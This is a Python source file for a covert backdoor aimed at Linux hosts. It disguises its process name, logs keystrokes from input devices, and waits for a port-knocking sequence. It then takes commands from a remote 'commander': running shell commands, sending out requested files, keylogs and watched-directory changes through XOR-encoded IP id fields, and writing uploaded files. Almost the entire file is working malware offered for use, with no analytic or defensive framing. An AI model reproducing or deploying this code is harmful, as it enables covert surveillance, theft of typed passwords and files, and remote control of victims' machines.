import sys
import struct
import os
import psutil
import setproctitle
import shlex
import time
import subprocess
from string import punctuation
from multiprocessing import Process
from watchdog.observers import Observer
from watchdog.events import FileSystemEventHandler
from scapy.all import *

ENCRYPTKEY = '0100101011010111'

KEYMAP = {1: 'ESC', 2: '1', 3: '2', 4: '3',
          5: '4', 6: '5', 7: '6', 8: '7',
          9: '8', 10: '9', 11: '0', 12: '-',
          13: '=', 14: 'Backspace', 15: 'Tab', 16: 'Q',
          17: 'W', 18: 'E', 19: 'R', 20: 'T',
          21: 'Y', 22: 'U', 23: 'I', 24: 'O',
          25: 'P', 26: '[', 27: ']', 28: 'Enter',
          29: 'LeftControl', 30: 'A', 31: 'S', 32: 'D',
          33: 'F', 34: 'G', 35: 'H', 36: 'J',
          37: 'K', 38: 'L', 39: ':', 40: "'",
          41: '`', 42: 'LeftShift', 43: '\\', 44: 'Z',
          45: 'X', 46: 'C', 47: 'V', 48: 'B',
          49: 'N', 50: 'M', 51: ',', 52: '.',
          53: '/', 54: 'RightShift', 55: 'Numpad*', 56: 'LeftAlt',
          57: 'Space', 58: 'CapsLock', 59: 'F1', 60: 'F2',
          61: 'F3', 62: 'F4', 63: 'F5', 64: 'F6',
          65: 'F7', 66: 'F8', 67: 'F9', 68: 'F10',
          69: 'NumLock', 70: 'ScrollLock', 71: '7', 72: '8',
          73: '9', 74: '-', 75: '4', 76: '5',
          77: '6', 78: '+', 79: '1', 80: '2',
          81: '3', 82: '0', 83: '.', 87: 'F11',
          88: 'F12', 97: 'RightControl', 100: 'RightAlt', 103: 'UpArrow',
          105: 'LeftArrow', 106: 'RightArrow', 108: 'DownArrow', 125: 'WindowsKey'}

EVENTMAP = {0: 'released',
            1: 'pressed',
            2: 'repeated'}

BANLIST = ["svchost.exe", "msedge.exe", "msedgewebview2.exe", "Code.exe", "conhost.exe"]

class MyHandler(FileSystemEventHandler):
    def __init__(self, t):
        print("Hit handler init")
        self.t = t

# Rewrite how this works for encryption.
    def deliverData(self, filePath):
        try:
            with open(filePath, 'rb') as f:
                data = f.read()
            encodedData = [format(x, '016b') for x in data]
            encodedData = [''.join([str(int(x[i])^int(ENCRYPTKEY[i])) for i in range(len(x))]) for x in encodedData]
            dataPackets = [IP(dst=self.t, id=int(x, 2)) / TCP(dport=5000) for x in encodedData]
            filePath = filePath.lstrip(punctuation)
            filePath += '$' + str(len(dataPackets)) + '$'
            encodedHeader = [format(ord(x), '016b') for x in filePath]
            encodedHeader = [''.join([str(int(x[i])^int(ENCRYPTKEY[i])) for i in range(len(x))]) for x in encodedHeader]
            headerPackets = [IP(dst=self.t, id=int(x, 2)) / TCP(dport=5000) for x in encodedHeader]
            for p in headerPackets:
                send(p)
            print("Done sending header")
            for p in dataPackets:
                send(p)
            print("Done sending data")
        except Exception as e:
            print(e)
            print("Error sending filewatch update.")

    def on_closed(self, event):
        if event.is_directory:
            pass
        else:
            self.deliverData(event.src_path)

def hideProcess():
    processes = psutil.process_iter()
    processCount = {}
    for proc in processes:
        try:
            processName = proc.name()
            print(f"Process name: {processName}")
            if processName not in BANLIST:
                if processName not in processCount:
                    processCount[processName] = 1
                else:
                    processCount[processName] += 1
        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
            pass
    if processCount:
        mostCommonProcess = max(processCount, key=processCount.get)
        setproctitle.setproctitle(mostCommonProcess)
        print(f"Process name changed to: {mostCommonProcess}")

def findKeyboardFile():
    try:
        with open("/proc/bus/input/devices", "r") as f:
            parsed = [line.split() for line in f if 'Handlers=sysrq kbd' in line and 'mouse' not in line]
            if len(parsed) > 0:
                return ['/dev/input/' + p for p in parsed[0] if 'event' in p][0]
            else:
                print("No keyboard file found")
                sys.exit(0)
    except FileNotFoundError as e:
        print(e)
        print("Could not find devices file. Potentially not a UNIX system.")

def elevatePrivilages():
    pass

def keylog():
    fileName = findKeyboardFile()
    eventStructure = 'llHHI'
    eventSize = struct.calcsize(eventStructure)
    with open(fileName, "rb") as file:
        with open("log.txt", "a+") as outputFile:
            while True:
                event = file.read(eventSize)
                (sec, ms, eventType, eventCode, value) = struct.unpack(eventStructure, event)
                if eventType == 1:
                    if eventCode in KEYMAP and value in EVENTMAP:
                        print("Writing to outputFile")
                        print(f"Key {KEYMAP[eventCode]} was {EVENTMAP[value]} \n")
                        outputFile.write(f'Key {KEYMAP[eventCode]} was {EVENTMAP[value]} \n')
                        outputFile.flush()
                        print("After writing.")

def setupEnvironment():
    systemAddresses = psutil.net_if_addrs()
    h = None
    for address in systemAddresses:
        if address != "lo":
            h = systemAddresses[address][0].address
            break
    if h is not None:
        return h, 5000
    
def portKnock(h):
    expected = [2048, 3024, 5081, 6035, 4096]
    levels = [[], [], [], []]
    commanderSrc = None
    def packetHandler(pkt):
        nonlocal commanderSrc
        if pkt.haslayer(IP) and pkt.haslayer(TCP):
            src = pkt[IP].src
            dst = pkt[IP].dst
            dstp = pkt[TCP].dport
            if dst == h:
                if int(dstp) == expected[4]:
                    print(f"Source: {src} Attempted final key.")
                    count = 0
                    for level in levels:
                        if src in level:
                            count += 1
                    if count == 4:
                        #Sequence accepted.
                        print("Accepted.")
                        commanderSrc = src
                        print("Return True hit")
                        return True
                    else:
                        #Sequence denied clear src from levels.
                        print("Denied.")
                        for level in levels:
                            try:
                                level.remove(src)
                            except ValueError:
                                pass
                else:
                    for i in range(0, len(levels)):
                        if int(dstp) == expected[i]:
                            print(f"Source: {src} passed level: {i}")
                            levels[i].append(src)
                            break
    sniff(filter="tcp", stop_filter=packetHandler)
    print("Done port knocking.")
    return commanderSrc

def makeTreeFile(path="."):
    with open("treefile.txt", "w") as f:
        for root, dirs, files in os.walk(path):
            depth = root.replace(path, '').count(os.sep)
            indent = ' ' * 4 * (depth)
            f.write('{}{}/'.format(indent, os.path.basename(root)))
            f.write("\n")
            subindent = ' ' * 4 * (depth + 1)
            for file in files:
                f.write('{}{}'.format(subindent, file))
                f.write("\n")

def getTree():
    makeTreeFile()
    try:
        with open("treefile.txt", 'rb') as f:
            data = f.read()
            return "treefile.txt", data
    except FileNotFoundError as e:
        print(e)
        print("Tree file not found. retrying.")
        getTree()

def sendFile(s, n):
    file = n
    try:
        with open(file, 'rb') as f:
            data = f.read()
    except FileNotFoundError as e:
        print(e)
        print("Creating directory tree file to send instead")
        file, data = getTree()
    if file == "log.txt":
        os.remove(file)
    encodedData = [format(x, '016b') for x in data]
    encodedData = [''.join([str(int(x[i])^int(ENCRYPTKEY[i])) for i in range(len(x))]) for x in encodedData]
    dataPackets = [IP(dst = s, id = int(x, 2)) / TCP(dport = 5000) for x in encodedData]
    file += '$' + str(len(dataPackets)) + '$'
    print(f"File: {file}")
    encodedHeader = [format(ord(x), '016b') for x in file]
    encodedHeader = [''.join([str(int(x[i])^int(ENCRYPTKEY[i])) for i in range(len(x))]) for x in encodedHeader]
    headerPackets = [IP(dst = s, id = int(x, 2)) / TCP(dport = 5000) for x in encodedHeader]
    for packet in headerPackets:
        send(packet)
    print("Done sending header")
    for packet in dataPackets:
        send(packet)
    print("Done sending data")

def writeFile(h, d):
    byteData = bytes(int(d[i:i+8], 2) for i in range(0, len(d), 8))
    with open(h, 'wb') as f:
        f.write(byteData)
    print(f"Done writing file: {h}")

def commandSession(cs):
    KEYLOGGING = False
    WATCHING = False
    commandReceived = False
    command = None
    data = ""
    header = ""
    dataLength = ""
    headerDone = False
    lengthDone = False
    count = 0
    observer = Observer()
    keylogger = Process(target=keylog)
    SYN = 0x02
    def packetHandler(pkt):
        nonlocal commandReceived
        nonlocal command
        nonlocal keylogger
        nonlocal KEYLOGGING
        nonlocal WATCHING
        nonlocal header
        nonlocal headerDone
        nonlocal lengthDone
        nonlocal dataLength
        nonlocal data
        nonlocal count
        nonlocal observer
        if pkt.haslayer(IP) and pkt.haslayer(TCP):
            src = pkt[IP].src
            id = pkt[IP].id
            flags = pkt[TCP].flags
            id = format(id, '016b')
            id = ''.join([str(int(id[i])^int(ENCRYPTKEY[i])) for i in range(len(id))])
            if not commandReceived:
                print("Parsing data as command")
                command = chr(int(id[-8:], 2))
                commandReceived = True
            elif command == "0":
                #Disconnect
                commandReceived = False
                print("Received Disconnect")
                return True
            elif command == "1":
                # Uninstall
                print("Uninstall Received")
                os.remove("geoLogger.py")
                sys.exit(1)
            elif command == "2":
                #Start Keylogger
                if not KEYLOGGING:
                    print("Keylogger Started.")
                    KEYLOGGING = True
                    keylogger.start()
                commandReceived = False
            elif command == "3":
                #Stop Keylogger
                if KEYLOGGING:
                    keylogger.terminate()
                    print("Keylogger stopped")
                    KEYLOGGING = False
                commandReceived = False
            elif command == "4":
                #Transfer Keylog File
                if KEYLOGGING:
                    keylogger.terminate()
                print("Starting keylog transfer process")
                keylogTransfer = Process(target=sendFile, args=[src, "log.txt"])
                keylogTransfer.start()
                print("Begin transferring keylog file.")
                commandReceived = False
            elif command == "5":
                #Receive file from commander
                bit = chr(int(id[-8:], 2))
                if not headerDone:
                    if bit == "$":
                        headerDone = True
                        print("Header done")
                    else:
                        header += bit
                elif not lengthDone:
                    if bit == "$":
                        lengthDone = True
                        dataLength = int(dataLength)
                        print("Length Done")
                    else:
                        dataLength += bit
                else:
                    data += id[-8:]
                    count += 1
                    print(f"Count: {count} Length: {dataLength}")
                    if count == dataLength:
                        #Done receiving file. Reset params.
                        print("Data done")
                        writeFile(header, data)
                        data = ""
                        header = ""
                        dataLength = ""
                        headerDone = False
                        lengthDone = False
                        count = 0
                        commandReceived = False
            elif command == "6":
                #Send requested file to commander
                bit = chr(int(id[-8:], 2))
                print(f"Bit: {bit}")
                if bit == "$":
                    print("Header done")
                    print(f"Finalized Header: {header}")
                    fileTransfer = Process(target=sendFile, args=[src, header])
                    fileTransfer.start()
                    print(f"Begin transferring file {header}")
                    header = ""
                    commandReceived = False
                else:
                    header += bit
            elif command == "7":
                #Watch path received from commander
                bit = chr(int(id[-8:], 2))
                if bit == '$':
                    if not WATCHING:
                        print(f"Starting observer on path: {header}")
                        observer.schedule(MyHandler(cs), header, recursive=False)
                        observer.start()
                        header = ""
                        commandReceived = False
                        WATCHING = True
                    else:
                        print(f"Already watching.")
                        header = ""
                        commandReceived = False
                else:
                    header += bit
            elif command == "8":
                #Stop watching path
                if WATCHING:
                    print("Stopping watcher")
                    observer.stop()
                    observer.join()
                    WATCHING = False
                else:
                    print("Not watching")
                commandReceived = False
            elif command == "9":
                #Run program designated by commander
                bit = chr(int(id[-8:], 2))
                if not headerDone:
                    if bit == '$':
                        headerDone = True
                    else:
                        header += bit
                else:
                    if bit == '$':
                        try:
                            if header == 'y':
                                result = subprocess.run([data], shell=True, capture_output=True, encoding="utf-8")
                            else:
                                result = subprocess.run(shlex.split(data), capture_output=True, encoding="utf-8")
                            time.sleep(2)
                            stdout = result.stdout + '$'
                            print(f"Stdout: {stdout}")
                            encodedResult = [format(ord(x), '016b') for x in stdout]
                            encodedResult = [''.join([str(int(x[i])^int(ENCRYPTKEY[i])) for i in range(len(x))]) for x in encodedResult]
                            resultPackets = [IP(dst=cs, id=int(x, 2)) / TCP(dport=5000) for x in encodedResult]
                            for p in resultPackets:
                                send(p)
                        except Exception as e:
                            print(e)
                        commandReceived = False
                        headerDone = False
                        header = ""
                    else:
                        data += bit
            print(f"Command: {command}")
    sniff(lfilter = lambda x: x.haslayer(IP) and x[IP].src == cs and x.haslayer(TCP) and x[TCP].flags & SYN, stop_filter=packetHandler)

def main():
    elevatePrivilages()
    hideProcess()
    HOST, SERVICE_PORT = setupEnvironment()
    while True:
        cs = portKnock(HOST)
        print(f"Source of commander: {cs}")
        commandSession(cs)
main()
